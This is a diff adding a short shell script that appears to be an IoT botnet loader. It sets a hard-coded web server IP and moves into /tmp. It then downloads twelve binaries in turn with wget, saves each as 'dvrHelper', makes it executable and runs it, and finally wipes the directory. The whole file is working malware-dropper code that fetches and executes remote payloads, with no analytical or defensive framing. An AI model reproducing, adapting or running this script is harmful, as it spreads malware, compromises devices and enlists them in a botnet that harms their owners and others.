@@ -1,0 +1,19 @@
+#!/bin/sh
+
+# Edit
+
+WEBSERVER="89.34.26.34:80"
+
+# Stop editing now
+
+cd /tmp
+
+BINARIES="ilovepenis0 ilovepenis10 ilovepenis2 ilovepenis4 ilovepenis6 ilovepenis8 ilovepenis1 ilovepenis11 ilovepenis3 ilovepenis5 ilovepenis7 ilovepenis9"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
+
+rm -f *
